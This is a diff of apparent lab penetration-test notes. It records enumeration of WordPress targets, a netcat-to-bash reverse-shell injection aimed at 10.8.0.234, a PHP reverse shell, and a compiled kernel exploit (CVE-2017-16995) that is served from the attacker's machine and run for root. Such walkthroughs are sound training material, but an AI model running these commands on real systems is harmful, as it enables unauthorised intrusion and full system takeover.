@@ -1,110 +1,269 @@
 
-└─$ nmap -sV -A -p 80 172.16.33.49
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-28 02:16 EDT
-Nmap scan report for 172.16.33.49
-Host is up (0.037s latency).
 
+└─$ nmap -p- 172.16.33.51 --open --reason
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 22:22 HKT
+Nmap scan report for 172.16.33.51
+Host is up, received syn-ack (0.033s latency).
+Not shown: 65384 closed tcp ports (conn-refused), 148 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+
+
+└─$ nmap -sV -A 172.16.33.51 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 22:24 HKT
+Nmap scan report for 172.16.33.51
+Host is up (0.034s latency).
+Not shown: 997 closed tcp ports (conn-refused)
 PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+21/tcp open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:172.16.33.1
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 08:ee:e3:ff:31:20:87:6c:12:e7:1c:aa:c4:e7:54:f2 (RSA)
+|   256 ad:e1:1c:7d:e7:86:76:be:9a:a8:bd:b9:68:92:77:87 (ECDSA)
+|_  256 0c:e1:eb:06:0c:5c:b5:cc:1b:d1:fa:56:06:22:31:67 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+| http-robots.txt: 1 disallowed entry 
+|_Hackers
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 9.34 seconds
+Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
 
 
-└─$ sudo dirsearch -u http://172.16.33.49
-[sudo] password for kali: 
-/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
-  from pkg_resources import DistributionNotFound, VersionConflict
-
-  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                     
- (_||| _) (/_(_|| (_| )                                                                                                                              
-                                                                                                                                                     
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
-
-Output File: /home/kali/reports/http_172.16.33.49/_24-04-28_02-19-43.txt
-
-Target: http://172.16.33.49/
-
-[02:19:43] Starting:                                                                                                                                 
-[02:19:46] 403 -  277B  - /.ht_wsr.txt                                      
-[02:19:46] 403 -  277B  - /.htaccess.bak1                                   
-[02:19:46] 403 -  277B  - /.htaccess.orig                                   
-[02:19:46] 403 -  277B  - /.htaccess.sample
-[02:19:46] 403 -  277B  - /.htaccess.save                                   
-[02:19:46] 403 -  277B  - /.htaccess_sc
-[02:19:46] 403 -  277B  - /.htaccess_extra                                  
-[02:19:46] 403 -  277B  - /.htaccess_orig
-[02:19:46] 403 -  277B  - /.htaccessBAK
-[02:19:46] 403 -  277B  - /.htaccessOLD
-[02:19:46] 403 -  277B  - /.htaccessOLD2
-[02:19:46] 403 -  277B  - /.htm                                             
-[02:19:46] 403 -  277B  - /.html                                            
-[02:19:46] 403 -  277B  - /.htpasswd_test                                   
-[02:19:46] 403 -  277B  - /.htpasswds
-[02:19:46] 403 -  277B  - /.httr-oauth                                      
-[02:19:48] 403 -  277B  - /.php                                             
-[02:19:52] 200 -  417B  - /admin                                            
-[02:20:13] 403 -  277B  - /server-status/                                   
-[02:20:13] 403 -  277B  - /server-status                                    
-                                                                             
-Task Completed               
-
-#80: index.php found nothing, as well as /admin 
-
-└─$ sudo dirsearch -f -e php -u http://172.16.33.49
+└─$ dirsearch -u 172.16.33.51
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
   from pkg_resources import DistributionNotFound, VersionConflict
 
   _|. _ _  _  _  _ _|_    v0.4.3
  (_||| _) (/_(_|| (_| )
 
-Extensions: php | HTTP method: GET | Threads: 25 | Wordlist size: 14331
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
 
-Output File: /home/kali/reports/http_172.16.33.49/_24-04-28_02-31-22.txt
+Output File: /home/kali/reports/_172.16.33.51/_24-04-18_22-30-20.txt
 
-Target: http://172.16.33.49/
+Target: http://172.16.33.51/
 
-[02:31:22] Starting: 
-[02:31:25] 403 -  277B  - /.ht_wsr.txt
-[02:31:25] 403 -  277B  - /.htaccess.bak1
-[02:31:25] 403 -  277B  - /.htaccess.orig
-[02:31:25] 403 -  277B  - /.htaccess.save
-[02:31:25] 403 -  277B  - /.htaccess.sample
-[02:31:25] 403 -  277B  - /.htaccess_extra
-[02:31:25] 403 -  277B  - /.htaccessBAK
-[02:31:25] 403 -  277B  - /.htaccess_orig
-[02:31:25] 403 -  277B  - /.htaccess_sc
-[02:31:25] 403 -  277B  - /.htaccessOLD
-[02:31:25] 403 -  277B  - /.htaccessOLD2
-[02:31:25] 403 -  277B  - /.htm
-[02:31:25] 403 -  277B  - /.html
-[02:31:25] 403 -  277B  - /.htpasswd_test
-[02:31:25] 403 -  277B  - /.httr-oauth
-[02:31:25] 403 -  277B  - /.htpasswds
-[02:31:25] 403 -  277B  - /.php
-[02:31:29] 200 -  417B  - /admin
-[02:31:42] 403 -  277B  - /icons/
-[02:31:53] 403 -  277B  - /server-status/
-[02:31:53] 403 -  277B  - /server-status
-[02:31:56] 200 -  132B  - /superadmin.php
+[22:30:20] Starting: 
+[22:30:24] 403 -  298B  - /.ht_wsr.txt
+[22:30:24] 403 -  301B  - /.htaccess.bak1
+[22:30:24] 403 -  303B  - /.htaccess.sample
+[22:30:24] 403 -  301B  - /.htaccess.save
+[22:30:24] 403 -  301B  - /.htaccess.orig
+[22:30:24] 403 -  302B  - /.htaccess_extra
+[22:30:24] 403 -  301B  - /.htaccess_orig
+[22:30:24] 403 -  299B  - /.htaccess_sc
+[22:30:24] 403 -  299B  - /.htaccessBAK
+[22:30:24] 403 -  299B  - /.htaccessOLD
+[22:30:24] 403 -  300B  - /.htaccessOLD2
+[22:30:24] 403 -  291B  - /.htm
+[22:30:24] 403 -  292B  - /.html
+[22:30:24] 403 -  301B  - /.htpasswd_test
+[22:30:24] 403 -  297B  - /.htpasswds
+[22:30:24] 403 -  298B  - /.httr-oauth
+[22:30:25] 403 -  291B  - /.php
+[22:30:25] 403 -  292B  - /.php3
+[22:30:37] 200 -  224B  - /CHANGELOG
+[22:30:39] 200 -   34KB - /COPYING
+[22:30:46] 200 -    1KB - /INSTALL
+[22:30:46] 301 -  317B  - /javascript  ->  http://172.16.33.51/javascript/
+[22:30:48] 200 -    2KB - /LICENSE
+[22:30:59] 200 -  954B  - /README.md
+[22:31:00] 200 -  315B  - /robots.txt
+[22:31:01] 403 -  300B  - /server-status
+[22:31:01] 403 -  301B  - /server-status/
+[22:31:07] 301 -  313B  - /upload  ->  http://172.16.33.51/upload/
+[22:31:07] 500 -   67B  - /upload/
+[22:31:11] 200 -    1KB - /wordpress/wp-login.php
+[22:31:11] 200 -    2KB - /wordpress/
 
 Task Completed
 
 
-/superadmin.php #this is a web subjected to command injection 
+WordPress Core < 4.7.1 - Username Enumeration                               | php/webapps/41497.php
+WordPress Core < 4.7.4 - Unauthorized Password Reset                        | linux/webapps/41963.txt
 
 
-    under superadmin.php
+http://172.16.33.51/wordpress/wp-admin/theme-editor.php?file=content-link.php&theme=twentyfourteen
+
+http://172.16.33.51/wordpress/wp-content/themes/twentyfourteen/content-link.php
 
 
-        1| cat superadmin.php
+─$ wpscan --url http://172.16.33.51/wordpress/ --enumerate u   
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://172.16.33.51/wordpress/ [172.16.33.51]
+[+] Started: Thu Apr 18 23:55:44 2024
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://172.16.33.51/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://172.16.33.51/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://172.16.33.51/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://172.16.33.51/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 3.9.14 identified (Insecure, released on 2016-09-07).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://172.16.33.51/wordpress/?feed=rss2, <generator>http://wordpress.org/?v=3.9.14</generator>
+ |  - http://172.16.33.51/wordpress/?feed=comments-rss2, <generator>http://wordpress.org/?v=3.9.14</generator>
+
+[+] WordPress theme in use: twentyfourteen
+ | Location: http://172.16.33.51/wordpress/wp-content/themes/twentyfourteen/
+ | Latest Version: 3.9
+ | Last Updated: 2024-04-02T00:00:00.000Z
+ | Style URL: http://172.16.33.51/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | The version could not be determined.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] btrisk
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+
+[+] admin
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Thu Apr 18 23:55:48 2024
+[+] Requests Done: 59
+[+] Cached Requests: 6
+[+] Data Sent: 16.534 KB
+[+] Data Received: 87.458 KB
+[+] Memory used: 198.133 MB
+[+] Elapsed time: 00:00:04
+
+
+/usr/share/webshells/php/php-reverse-shell.php
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+$ uname -a
+Linux ubuntu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 
 
 
-        10.8.0.234 submitt
-        pinger=10.8.0.234&submitt=Submit+Query
+on the host 
+ed@1nk:~$ searchsploit ubuntu | grep 4.4.0
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalati | linux_x86-64/local/40871.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)                                           | linux/dos/41457.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation                            | linux/local/41458.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege E | linux_x86-64/local/40049.c
+Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privile | windows_x86-64/local/47170.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                         | linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalat | linux_x86-64/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR  | linux/local/43418.c
+Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privileg | linux/local/47169.c
 
-1| n''c 10.8.0.234 2211|bash|n''c 10.8.0.234 2212
-        
+
+└─$ searchsploit -m 44298.c
+
+  Exploit: Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/44298
+     Path: /usr/share/exploitdb/exploits/linux/local/44298.c
+    Codes: CVE-2017-16995
+ Verified: False
+File Type: C source, ASCII text
+Copied to: /home/kali/44298.c
+
+┌──(kali㉿kali)-[~/44298]
+└─$ gcc 44298.c -o 1.out --static
+
+┌──(kali㉿kali)-[~/44298]
+└─$ sudo python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+172.16.33.51 - - [19/Apr/2024 00:02:16] "GET /1.out HTTP/1.1" 200 -
+
+
+$chmod +x 1.out
+$ ls -la
+total 1552
+drwxrwxrwt  8 root     root       4096 Nov 16 05:31 .
+drwxr-xr-x 22 root     root       4096 Mar 17  2017 ..
+drwxrwxrwt  2 root     root       4096 Nov 15 21:34 .ICE-unix
+drwxrwxrwt  2 root     root       4096 Nov 15 21:34 .Test-unix
+drwxrwxrwt  2 root     root       4096 Nov 15 21:34 .X11-unix
+drwxrwxrwt  2 root     root       4096 Nov 15 21:34 .XIM-unix
+drwxrwxrwt  2 root     root       4096 Nov 15 21:34 .font-unix
+-rwxrwxrwx  1 www-data www-data 776448 Apr 18  2024 1.out
+-rw-rw-rw-  1 www-data www-data 776448 Apr 18  2024 1.out.1
+
+$ ./1.out
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+whoami
+root
+python3 -c "import pty; pty.spawn('/bin/bash')"
+root@ubuntu:/tmp# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+
+
